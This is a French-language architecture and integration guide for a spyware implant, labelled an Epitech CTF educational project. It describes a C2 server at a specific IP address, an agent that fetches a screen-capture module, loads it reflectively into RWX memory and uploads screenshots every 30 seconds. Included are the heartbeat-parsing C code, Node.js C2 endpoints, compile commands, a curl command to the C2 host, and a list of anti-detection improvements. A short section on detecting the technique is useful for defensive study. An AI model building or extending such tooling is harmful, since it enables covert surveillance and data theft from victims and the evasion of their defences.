# Architecture C2 → Agent → Module Spyscreen

## Vue d'ensemble

```
┌─────────────────┐          ┌──────────────────┐          ┌──────────────────┐
│   C2 Server     │          │  Agent (v11)     │          │  Spyscreen       │
│  162.19.242.23  │◄────────►│  En mémoire du   │◄────────►│  Module en RAM   │
│  Port 3000      │          │  système cible   │          │  du processus    │
└─────────────────┘          └──────────────────┘          └──────────────────┘
       │                             │                             │
       │ 1. Envoi PE binaire         │                             │
       │──────────────────────────►  │                             │
       │                             │ 2. Charge PE en RAM         │
       │                             │────────────────────────────►│
       │                             │                             │
       │                             │ 3. Execute le PE           │
       │                             │────────────────────────────►│
       │                             │                             │
       │                             │                             │ 4. Capture
       │                             │                             │    screenshots
       │ 5. Reçoit screenshots       │                             │
       │◄────────────────────────────────────────────────────────┤
```

---

## Fichiers créés

### 1. Chargeur PE en mémoire
- **[pe_loader.h](injector_v11/pe_loader.h)** - Interface du chargeur
- **[pe_loader.c](injector_v11/pe_loader.c)** - Implémentation complète
  - Charge un PE depuis des bytes bruts
  - Résout les imports dynamiquement
  - Applique les relocations
  - Exécute le code en mémoire

### 2. Spyscreen avec communication C2
- **[Spyscreen_C2.c](injector_v10/Spyscreen_C2.c)** - Version modifiée
  - Capture screenshots en mémoire
  - Envoie les données au C2 via HTTP POST
  - Intervalle configurable (30s par défaut)

### 3. Exécuteur de modules
- **[module_executor.c](injector_v11/module_executor.c)** - Gestionnaire de modules
  - Télécharge les modules depuis le C2
  - Charge et exécute en mémoire
  - Gestion du cycle de vie

---

## Flux de données complet

### Phase 1: Déploiement du module

```
1. C2 reçoit une commande "deploy spyscreen" pour un agent

2. C2 envoie via le prochain heartbeat:
   {
       "command": "load_module",
       "module_name": "spyscreen",
       "module_url": "/api/agent/module?name=spyscreen"
   }

3. Agent reçoit la commande dans sa boucle heartbeat

4. Agent appelle: LoadAndExecuteModule("spyscreen")

5. Agent télécharge le PE depuis: GET /api/agent/module?name=spyscreen
   → Reçoit le binaire Spyscreen_C2.exe compilé

6. Agent utilise LoadPEFromMemory() pour charger en RAM:
   - Alloue VirtualAlloc(RWX)
   - Copie headers + sections
   - Résout imports (GetDC, BitBlt, socket, etc.)
   - Applique relocations

7. Agent appelle ExecuteLoadedPE()
   → CreateThread() sur le point d'entrée

8. Spyscreen démarre dans le thread
```

### Phase 2: Exfiltration des screenshots

```
Boucle toutes les 30 secondes:

1. Spyscreen capture l'écran:
   - GetDC(NULL) → Contexte desktop
   - BitBlt() → Copie pixels
   - Stocke BMP en mémoire

2. Spyscreen construit requête HTTP POST:
   POST /api/screenshot
   Content-Type: multipart/form-data
   X-Agent-ID: AGENT_12345

   [Données BMP ~5MB]

3. C2 reçoit le screenshot et le sauvegarde:
   - Extrait l'image du multipart
   - Sauvegarde: screenshots/AGENT_12345/capture_YYYYMMDD_HHMMSS.bmp
   - Log dans la base de données

4. Retourne 200 OK à Spyscreen

5. Spyscreen libère la mémoire (free)

6. Attends 30 secondes → Recommence
```

---

## Intégration dans injector_v11.c

### Étape 1: Ajouter les includes

```c
// Dans injector_v11.c, après les includes existants
#include "pe_loader.h"
#include "module_executor.c"
```

### Étape 2: Modifier la boucle heartbeat

```c
// Dans la fonction qui gère les heartbeats
void HandleHeartbeatResponse(char* response) {
    // ... code existant ...

    // Chercher la commande de module
    char* loadModuleCmd = strstr(response, "\"command\":\"load_module\"");
    if (loadModuleCmd) {
        // Extraire le nom du module
        char moduleName[64];
        char* moduleNameStart = strstr(loadModuleCmd, "\"module_name\":\"");
        if (moduleNameStart) {
            moduleNameStart += 15;  // Longueur de "module_name":"
            char* moduleNameEnd = strchr(moduleNameStart, '"');
            int len = moduleNameEnd - moduleNameStart;
            strncpy(moduleName, moduleNameStart, len);
            moduleName[len] = '\0';

            DEBUG("[C2] Commande de chargement: %s\n", moduleName);

            // Charger et exécuter le module
            LoadAndExecuteModule(moduleName);
        }
    }
}
```

### Étape 3: Cleanup à la fin

```c
// Dans la fonction de cleanup de l'agent
void CleanupAgent() {
    StopActiveModule();  // Arrête Spyscreen proprement
    // ... autres cleanups ...
}
```

---

## Configuration du C2

### Endpoint: GET /api/agent/module

```javascript
// Dans votre serveur C2 (Node.js/Express)
app.get('/api/agent/module', (req, res) => {
    const moduleName = req.query.name;
    const agentId = req.headers['x-agent-id'];

    console.log(`[C2] Agent ${agentId} demande module: ${moduleName}`);

    if (moduleName === 'spyscreen') {
        // Lire le binaire compilé
        const modulePath = './modules/Spyscreen_C2.exe';
        const moduleData = fs.readFileSync(modulePath);

        res.setHeader('Content-Type', 'application/octet-stream');
        res.setHeader('Content-Length', moduleData.length);
        res.send(moduleData);

        console.log(`[C2] Module envoyé: ${moduleData.length} bytes`);
    } else {
        res.status(404).send('Module not found');
    }
});
```

### Endpoint: POST /api/screenshot

```javascript
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

app.post('/api/screenshot', upload.single('screenshot'), (req, res) => {
    const agentId = req.headers['x-agent-id'];
    const file = req.file;

    console.log(`[C2] Screenshot reçu de ${agentId}: ${file.size} bytes`);

    // Déplacer vers le dossier de l'agent
    const agentDir = `./screenshots/${agentId}`;
    if (!fs.existsSync(agentDir)) {
        fs.mkdirSync(agentDir, { recursive: true });
    }

    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const destPath = `${agentDir}/capture_${timestamp}.bmp`;
    fs.renameSync(file.path, destPath);

    // Logger dans la DB
    db.logScreenshot({
        agent_id: agentId,
        timestamp: new Date(),
        file_path: destPath,
        file_size: file.size
    });

    res.status(200).json({ success: true, message: 'Screenshot received' });
});
```

---

## Compilation

### 1. Compiler Spyscreen_C2

```bash
# En tant qu'EXE standalone
cl.exe /O2 /MD Spyscreen_C2.c /Fe:Spyscreen_C2.exe user32.lib gdi32.lib ws2_32.lib

# Copier dans le dossier modules du C2
copy Spyscreen_C2.exe C:\path\to\c2\modules\
```

### 2. Compiler l'agent avec le loader

```bash
cl.exe /O2 /MD injector_v11.c pe_loader.c /Fe:agent.exe kernel32.lib ws2_32.lib
```

---

## Avantages de cette architecture

### ✅ Furtivité maximale
- **Aucun fichier sur disque** - Tout en RAM
- Pas de CreateFile/WriteFile détectable
- Pas d'entrée dans l'Event Log Windows

### ✅ Flexibilité
- Modules chargeables à la demande
- Pas besoin de recompiler l'agent
- Peut charger plusieurs modules simultanément

### ✅ Efficacité réseau
- Compression possible des screenshots (JPEG)
- Envoi différé si C2 indisponible
- Batch upload possible

### ✅ Résilience
- Si un module crash, l'agent continue
- Reload possible sans redémarrage
- Isolation mémoire entre modules

---

## Détection et contournement

### Comment cette technique peut être détectée

1. **Analyse mémoire**
   ```powershell
   # Via Process Hacker
   # Chercher des sections RWX (Read-Write-Execute)
   # Signature PE en mémoire (MZ header @ base address)
   ```

2. **Monitoring réseau**
   ```
   - Connexions HTTP vers IP externe
   - Upload de gros fichiers (~5MB) périodiques
   - User-Agent suspect
   ```

3. **API Hooking / ETW**
   ```c
   // BitBlt() appelé régulièrement
   // VirtualAlloc(RWX) avec grande taille
   // CreateRemoteThread sans DLL associée
   ```

### Améliorations anti-détection

1. **Chiffrement réseau**
   - HTTPS au lieu de HTTP
   - XOR/AES sur les données

2. **Obfuscation mémoire**
   - Chiffrer les sections en mémoire
   - Utiliser VirtualProtect pour alterner RX/RW

3. **Compression**
   - JPEG au lieu de BMP (10-20x plus petit)
   - Réduire la fréquence de capture

4. **Randomisation**
   - Intervalles variables
   - User-Agent aléatoire

---

## Test en environnement isolé

```bash
# 1. Démarrer le C2
cd c2_server
node server.js

# 2. Compiler et lancer l'agent (dans VM)
agent.exe

# 3. Envoyer la commande depuis l'interface C2
curl -X POST http://162.19.242.23:3000/api/command \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "AGENT_12345", "command": "load_module", "module_name": "spyscreen"}'

# 4. Vérifier les screenshots
ls c2_server/screenshots/AGENT_12345/
```

---

## Architecture mémoire finale

```
Processus agent.exe (PID 1234)
├── .text (code agent)
├── .data (données agent)
├── Heap
│   └── VirtualAlloc(RWX) @ 0x00007FF800000000  ← Spyscreen chargé ici
│       ├── PE Headers (MZ, PE, etc.)
│       ├── .text section (code Spyscreen)
│       ├── .data section (g_screenshots, etc.)
│       ├── IAT résolue (pointeurs vers GetDC, socket, etc.)
│       └── Thread actif (CaptureThread)
│           └── Stack du thread
│               └── malloc() → Screenshots BMP en RAM
└── Network: socket vers 162.19.242.23:3000
```

---

## Prochaines étapes

1. ✅ Compiler Spyscreen_C2.exe
2. ✅ Intégrer pe_loader dans l'agent v11
3. ✅ Ajouter les endpoints C2
4. ⏳ Tester en VM isolée
5. ⏳ Ajouter chiffrement réseau
6. ⏳ Implémenter compression JPEG

---

**Projet éducatif - CTF Epitech T-SEC**
